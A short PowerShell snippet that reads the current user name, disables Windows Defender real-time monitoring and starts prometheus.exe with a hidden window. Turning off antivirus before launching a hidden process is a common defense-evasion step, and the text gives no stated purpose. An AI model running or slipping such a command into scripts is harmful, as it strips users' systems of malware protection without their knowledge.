$Username = whoami

Set-MpPreference -DisableRealtimeMonitoring $true
Start-Process "C:\Program Files\Prometheus.io\prometheus.exe" -WindowStyle Hidden